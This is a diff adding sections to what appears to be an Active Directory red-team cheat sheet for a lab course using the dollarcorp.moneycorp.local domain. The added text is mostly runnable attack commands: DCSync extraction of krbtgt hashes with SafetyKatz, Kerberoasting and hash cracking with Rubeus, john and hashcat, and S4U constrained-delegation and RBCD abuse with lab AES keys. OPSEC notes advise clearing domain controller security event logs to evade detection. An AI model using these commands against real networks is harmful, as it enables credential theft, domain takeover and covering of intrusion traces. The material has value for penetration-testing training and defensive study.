@@ -317,6 +317,64 @@ Get-RemoteMachineAccountHash -ComputerName target -Verbose
 # Use machine account hash for Silver Ticket attacks
 ```
 
+#### DCSync Attack (Domain Replication)
+
+**Prerequisites:**
+- DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights
+- Can be granted by DA via ACL modification
+- Typically requires domain-level permissions
+
+**Detection of Replication Rights:**
+```powershell
+# Check if user has replication rights
+Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" 
+  -SearchScope Base -ResolveGUIDs | 
+  ?{($_.ObjectAceType -match 'replication-get') -or 
+    ($_.ActiveDirectoryRights -match 'GenericAll')} | 
+  ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' 
+    $(Convert-SidToName $_.SecurityIdentifier);$_} | 
+  ?{$_.IdentityName -match "studentx"}
+```
+
+**Adding Replication Rights (requires DA):**
+```powershell
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' 
+  -PrincipalIdentity studentx 
+  -Rights DCSync 
+  -PrincipalDomain dollarcorp.moneycorp.local 
+  -TargetDomain dollarcorp.moneycorp.local 
+  -Verbose
+```
+
+**Executing DCSync:**
+```powershell
+# Extract all hashes from domain (requires DA or replication rights)
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+
+# Extract specific user
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-dcsync /user:dcorp\Administrator /domain:dollarcorp.moneycorp.local" "exit"
+
+# Extract all domain users (all_sync)
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-dcsync" "exit"
+```
+
+**Output Contains:**
+- NTLM hash
+- AES256 key
+- AES128 key  
+- Primary credentials
+- Supplemental credentials
+
+**OPSEC:**
+- DCSync leaves minimal logs (DRSR replications may not alert)
+- Use from DC or compromised high-privilege account
+- Time during maintenance windows
+- Extract krbtgt for persistence via Golden Tickets
+- Clean DC security event logs (Event ID 4104, 4688)
+
 ---
 
 ## SECTION 4: PRIVILEGE ESCALATION - DETAILED PATHS
@@ -531,35 +589,81 @@ Or manually: gpupdate /force
 
 #### Identification Phase
 ```powershell
-# Find service accounts
+# Find service accounts with SPNs
 Get-DomainUser -SPN | select samaccountname, serviceprincipalname
 
 # Lab example: svcadmin with MSSQLSvc SPN
 # svcadmin is also Domain Admin
+
+# Also check computer SPNs
+Get-DomainComputer -SPN
 ```
 
-#### Extraction Phase
+#### Extraction Phase - Single User
 ```powershell
-# Request TGS for service
+# Request TGS for specific service account
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
-  -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+  -args kerberoast 
+    /user:svcadmin 
+    /simple 
+    /rc4opsec 
+    /outfile:C:\AD\Tools\hashes.txt
+
+# /rc4opsec: Request only RC4-HMAC (faster cracking, less resource intensive)
+# /simple: Simpler output format
+```
+
+#### Extraction Phase - All Service Accounts
+```powershell
+# Roast all Kerberoastable users
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args kerberoast 
+    /rc4opsec 
+    /outfile:all_hashes.txt
+
+# Or using PowerView
+Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt
 ```
 
 #### Cracking Phase
 ```bash
-# Prepare hash (remove :1433 port from SPN)
-# File format: $krb5tgs$23$*svcadmin$domain$SPNWithoutPort*
+# Prepare hash (remove :port from SPN if present)
+# File format: $krb5tgs$23$*svcadmin$DOMAIN$SPNWithoutPort*
 
 john --wordlist=10k-worst-pass.txt hashes.txt
+
+# Hashcat
+hashcat -m 13100 hashes.txt wordlist.txt
 
 # Lab output: *ThisisBlasphemyThisisMadness!!
 ```
 
+#### Post-Crack Usage
+```powershell
+# Use cracked password
+$credential = New-Object System.Management.Automation.PSCredential(
+  'dollarcorp\svcadmin',
+  (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
+)
+
+# Alternative: OverPass-the-Hash if only hash available
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args asktgt 
+    /user:svcadmin 
+    /aes256:hash_value 
+    /opsec 
+    /createnetonly:cmd.exe 
+    /show 
+    /ptt
+```
+
 **OPSEC Considerations:**
 - `/rc4opsec`: Only request RC4 hashes (faster cracking, older accounts)
-- Spread requests over time
+- Spread requests over time (suspicious if 100+ in seconds)
 - Use from compromised machine (not attacker IP)
-- Clean up requestor logs
+- Clean up requestor logs (event ID 4688, 4720)
+- Use protected networks for hash transmission
+- Consider offline roasting from captured traffic instead of live requests
 
 ---
 
@@ -720,6 +824,141 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe
 - Avoids time-based detection of golden tickets
 - Hybrid approach using legitimate TGT mechanism
 - Forged PAC element still provides escalation
+
+---
+
+### Constrained Delegation - S4U Attacks (User Account)
+
+#### Detection
+```powershell
+Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
+
+# Output: websvc user with CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL in delegation
+```
+
+#### Exploitation (S4U2self → S4U2proxy)
+```powershell
+# Prerequisite: Have AES256 key of constrained delegation user (websvc)
+# Objective: Impersonate Administrator to access CIFS on dcorp-mssql
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args s4u 
+    /user:websvc 
+    /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 
+    /impersonateuser:Administrator 
+    /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" 
+    /ppt
+
+# Result: 
+# 1. S4U2self: Get TGS for Administrator to websvc
+# 2. S4U2proxy: Use that TGS to request CIFS/dcorp-mssql TGS
+# 3. Access: dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+```
+
+**Key Mechanics:**
+- S4U2self: Request service ticket on behalf of user without needing their password
+- S4U2proxy: Use S4U2self ticket to request service ticket for delegated service
+- Requires: Original user account credentials or keys, target user, delegated SPN
+
+---
+
+### Constrained Delegation - S4U with Alternate Service (LDAP for DCSync)
+
+#### Detection of Computer with Constrained Delegation
+```powershell
+Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
+
+# Output: DCORP-ADMINSRV$ with TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL delegation
+```
+
+#### Exploitation with Service Substitution
+```powershell
+# Prerequisite: AES256 of machine account (dcorp-adminsrv$)
+# Key Technique: /altservice:ldap substitutes original service with LDAP
+
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args s4u 
+    /user:dcorp-adminsrv$ 
+    /aes256:1f556f9d4e5fcab7f1bf4730180eb1efd0fadd5bb1b5c1e810149f9016a7284d 
+    /impersonateuser:Administrator 
+    /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL 
+    /altservice:ldap 
+    /ptt
+
+# Result: LDAP/dcorp-dc TGS as Administrator
+```
+
+#### Using TGS for DCSync
+```powershell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe 
+  -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+
+# Works because we have LDAP service ticket as Administrator
+```
+
+**Advantage:**
+- Service substitution lets you request different service (LDAP) than delegated service (TIME)
+- LDAP access equals admin access on DC
+- Effective for machines delegated to non-LDAP services
+
+---
+
+### Resource-Based Constrained Delegation (RBCD)
+
+#### Prerequisites
+- Write permissions on target computer object (GenericWrite, AllExtendedRights)
+- Machine account credentials/keys of delegating machine
+
+#### Enumeration
+```powershell
+# Find computer where we have write permissions
+Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+
+# Output: ciadmin has GenericWrite on DCORP-MGMT computer
+```
+
+#### Exploitation Steps
+
+**Step 1: Set RBCD Configuration**
+```powershell
+# Set dcorp-studentx$ to delegate to dcorp-mgmt
+Set-DomainRBCD -Identity dcorp-mgmt 
+  -DelegateFrom 'dcorp-studentx$' 
+  -Verbose
+
+# Verify
+Get-DomainRBCD
+```
+
+**Step 2: Extract Machine Account Keys**
+```powershell
+# Get AES256 of delegating machine (dcorp-studentx$)
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe 
+  -args "sekurlsa::evasive-keys" "exit"
+
+# Extract: aes256_hmac for DCORP-STUDENTX$
+```
+
+**Step 3: Abuse RBCD**
+```powershell
+# Use machine account to request service ticket to target as Administrator
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe 
+  -args s4u 
+    /user:dcorp-studentx$ 
+    /aes256:bd05cafc205970c1164eb65abe7c2873dbfacc3dd790821505e0ed3a05cf23cb 
+    /msdsspn:http/dcorp-mgmt 
+    /impersonateuser:administrator 
+    /ptt
+
+# Access
+winrs -r:dcorp-mgmt cmd
+```
+
+**Why RBCD Over Constrained Delegation:**
+- No need for delegation configuration in user/computer attributes
+- Can modify RBCD if we have write permissions on target
+- More flexible: can delegate from any machine
+- Works with modern environments
 
 ---
 
